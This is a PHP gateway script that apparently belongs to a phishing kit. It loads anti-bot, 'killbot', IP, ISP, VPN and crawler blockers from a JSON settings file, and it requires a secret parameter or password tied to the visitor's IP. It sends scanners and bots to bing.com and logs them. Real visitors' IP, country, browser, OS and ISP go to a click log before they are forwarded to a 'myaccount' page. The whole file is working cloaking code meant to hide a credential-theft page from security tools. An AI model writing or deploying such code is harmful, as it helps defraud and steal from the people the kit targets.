<?php
error_reporting(0);
session_start();
require 'main.php';
require_once("lang.php");
require_once 'blocker.php';
require_once("antibot.php");
require_once("killbot.php");
$file = "G-SPOT/settingan.json";
$sett = file_get_contents($file);
$json = json_decode($sett);
$get_onetime = $json[6]->status;
$get_blockhost = $json[7]->status;
$get_blockua = $json[8]->status;
$get_blockip = $json[9]->status;
$get_blockisp = $json[10]->status;
$get_blockvpn = $json[11]->status;
$get_blockref = $json[12]->status;
if (filesize('antibot.ini') == 1) {
  require_once("antibot.php");
} elseif (filesize("killbot.ini") == 1) {
  require_once("killbot.php");
}
if($get_blockref == "on") {
  require_once("crawlerdetect.php");
}
if($get_blockip == "on") {
  require_once("blacklist.php");
}
if($get_blockip == "on") {
    require_once 'blacklist.php';
}
if($get_onetime == "on") {
  require_once("onetime.php");
}
if($get_blockvpn == "on") {
    require_once 'proxyblock.php';
}
if($site_param_on == "on") {
    $secret = $site_parameter;
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/total_bot.txt","$ip|Wrong Site Parameter");
          header("location: https://www.bing.com/");
        exit();
    }else{
        $_SESSION['key'] = $key;
    }
}
if($site_pass_on == "on") {
    $secret = md5($ip);
    $password = $_POST[$secret];
    $mypass = md5($site_password);
    if(!isset($password)) {
        tulis_file("result/total_bot.txt","$ip|Wrong Site Password");
        header("location: https://www.bing.com/");
        exit();;
    }else{
        $_SESSION['site_password'] = $site_password;
    }
}
tulis_file("result/total_click.txt","$ip|$countrycode|$countryname|$br|$os|$ispuser");
$_SESSION['key'] = $key;
header("location: myaccount?key=$key");
?>